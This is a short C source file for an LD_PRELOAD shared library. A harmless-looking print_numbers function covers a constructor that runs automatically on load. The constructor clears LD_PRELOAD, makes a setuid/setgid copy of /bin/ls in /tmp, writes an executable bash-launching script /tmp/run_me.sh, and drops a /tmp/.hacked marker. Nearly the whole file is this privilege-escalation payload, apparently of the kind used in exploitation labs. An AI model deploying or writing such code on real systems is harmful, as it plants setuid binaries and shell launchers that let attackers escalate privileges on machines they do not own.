#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void print_numbers() {
    printf("1 2 3 4 5 6\n");
}

void __attribute__((constructor)) preload(void) {
    unsetenv("LD_PRELOAD");
    system("cp /bin/ls /tmp/ls");
    system("chmod +xs /tmp/ls");
    system("echo '#!/bin/bash' > /tmp/run_me.sh");
    system("echo '/bin/bash' >> /tmp/run_me.sh");
    system("chmod +x /tmp/run_me.sh");
    system("echo '' > /tmp/.hacked");
}

